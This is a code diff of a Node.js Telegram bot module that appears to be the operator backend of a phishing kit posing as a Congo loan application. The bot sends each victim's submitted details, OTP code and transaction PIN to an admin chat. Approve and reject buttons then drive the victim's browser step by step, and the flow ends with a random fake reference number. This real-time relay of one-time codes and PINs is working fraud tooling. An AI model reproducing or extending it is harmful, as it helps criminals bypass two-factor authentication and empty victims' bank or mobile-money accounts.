@@ -1,82 +1,97 @@
-const TelegramBot = require('node-telegram-bot-api');
-const token = process.env.BOT_TOKEN;
-const adminChatId = process.env.ADMIN_CHAT_ID;
+require("dotenv").config();
+const TelegramBot = require("node-telegram-bot-api");
 
-// Initialize bot with webhook capabilities
-const bot = new TelegramBot(token);
+// Initialize bot without polling (Render uses webhooks)
+const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
+const ADMIN_ID = process.env.ADMIN_CHAT_ID;
 
-/**
- * Format string layout helper for object payloads
- */
-function formatPayload(data) {
-    return Object.entries(data)
-        .map(([key, val]) => `<b>${key}:</b> <code>${val}</code>`)
-        .join('\n');
-}
+const botManager = {
+    bot: bot,
 
-/**
- * Sends step information down to the admin chat with optional inline actions
- */
-function sendToAdmin(appId, stepTitle, data, requireAction = false, actionType = '') {
-    let message = `━━━━━━━━━━━━━━━━━━━━\n`;
-    message += `🛑 <b>[${appId}] - ${stepTitle}</b>\n`;
-    message += `━━━━━━━━━━━━━━━━━━━━\n`;
-    message += formatPayload(data);
-    message += `\n━━━━━━━━━━━━━━━━━━━━`;
+    sendToAdmin: (appId, title, data, needsApproval = false) => {
+        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        for (const [k, v] of Object.entries(data)) {
+            msg += `<b>${k}:</b> <code>${v}</code>\n`;
+        }
+        msg += `━━━━━━━━━━━━━━━━━━━━`;
 
-    let options = { parse_mode: 'HTML' };
+        const options = { parse_mode: 'HTML' };
+        if (needsApproval) {
+            options.reply_markup = {
+                inline_keyboard: [[
+                    // Step 4 Approval moves user to Step 5 (PIN screen)
+                    { text: "✅ APPROVE OTP", callback_data: `approve_4_${appId}` },
+                    { text: "❌ REJECT", callback_data: `reject_4_${appId}` }
+                ]]
+            };
+        }
+        bot.sendMessage(ADMIN_ID, msg, options);
+    },
 
-    if (requireAction) {
-        options.reply_markup = {
-            inline_keyboard: [
-                [
-                    { text: '✅ Approve', callback_data: `${actionType}_approve:${appId}` },
-                    { text: '❌ Reject', callback_data: `${actionType}_reject:${appId}` }
-                ]
-            ]
-        };
+    sendFinalApproval: (appId, pin) => {
+        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🏁 <b>🇨🇩 FINAL PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 PIN: <code>${pin}</code>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━`;
+        
+        bot.sendMessage(ADMIN_ID, msg, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [[
+                    { text: "✅ COMPLETE LOAN", callback_data: `approve_5_${appId}` },
+                    { text: "❌ REJECT", callback_data: `reject_5_${appId}` }
+                ]]
+            }
+        });
     }
+};
 
-    bot.sendMessage(adminChatId, message, options)
-        .catch(err => console.error(`❌ Telegram send error:`, err.message));
-}
+// Handle Admin Button Clicks
+bot.on("callback_query", (query) => {
+    const [action, step, appId] = query.data.split("_");
+    const io = global.io;
 
-// Handle Admin Callback Button Presses
-bot.on('callback_query', (query) => {
-    const { data, id } = query;
-    const [action, appId] = data.split(':');
-
-    // Answer callback immediately to stop telegram loading wheel
-    bot.answerCallbackQuery(id);
-
-    const globalIo = global.io;
-    if (!globalIo) {
-        bot.sendMessage(adminChatId, `⚠️ Error: Socket pipeline instance not linked.`);
+    if (!io) {
+        bot.answerCallbackQuery(query.id, { text: "Error: Socket instance missing" });
         return;
     }
 
-    if (action === 'otp_approve') {
-        // Step 4 Approved -> Tells frontend to move onto Step 5 (PIN)
-        globalIo.to(appId).emit('otp-verified');
-        bot.sendMessage(adminChatId, `🟢 <b>[${appId}]</b> OTP Approved! Moving client to Step 5 (PIN).`, { parse_mode: 'HTML' });
-    } 
-    else if (action === 'otp_reject') {
-        globalIo.to(appId).emit('otp-failed', { message: 'Invalid OTP code entered.' });
-        bot.sendMessage(adminChatId, `🔴 <b>[${appId}]</b> OTP Rejected by Admin.`, { parse_mode: 'HTML' });
-    } 
-    else if (action === 'pin_approve') {
-        // Step 5 Approved -> Generates unique reference code and closes loop
-        const referenceId = `COD-${Math.floor(100000 + Math.random() * 900000)}`;
-        globalIo.to(appId).emit('pin-verified', { referenceId: referenceId });
-        bot.sendMessage(adminChatId, `🟢 <b>[${appId}]</b> PIN Approved! Application Closed. Ref: ${referenceId}`, { parse_mode: 'HTML' });
-    } 
-    else if (action === 'pin_reject') {
-        globalIo.to(appId).emit('pin-failed', { message: 'Transaction PIN rejected.' });
-        bot.sendMessage(adminChatId, `🔴 <b>[${appId}]</b> PIN Rejected by Admin.`, { parse_mode: 'HTML' });
+    if (action === "approve") {
+        if (step === "4") {
+            // Signal frontend to move to Step 5 (PIN)
+            io.to(appId).emit('otp-verified');
+            bot.answerCallbackQuery(query.id, { text: "OTP Verified. PIN input shown to user." });
+        } 
+        else if (step === "5") {
+            // Signal frontend to show final success screen with Congo tracking ref
+            const ref = "COD-" + Math.floor(Math.random() * 900000 + 100000);
+            io.to(appId).emit('pin-verified', { referenceId: ref });
+            bot.answerCallbackQuery(query.id, { text: "Congo Application Completed!" });
+        }
+        
+        bot.editMessageText(query.message.text + `\n\n✅ <b>ACTION: APPROVED (STEP ${step})</b>`, {
+            chat_id: ADMIN_ID,
+            message_id: query.message.message_id,
+            parse_mode: 'HTML'
+        });
+    }
+
+    if (action === "reject") {
+        if (step === "4") {
+            io.to(appId).emit('otp-failed', { message: "OTP verification declined by admin." });
+            bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
+        } else if (step === "5") {
+            io.to(appId).emit('pin-failed', { message: "Transactional PIN declined by admin." });
+            bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
+        }
+
+        bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
+            chat_id: ADMIN_ID,
+            message_id: query.message.message_id,
+            parse_mode: 'HTML'
+        });
     }
 });
 
-module.exports = {
-    bot,
-    sendToAdmin
-};
+module.exports = botManager;
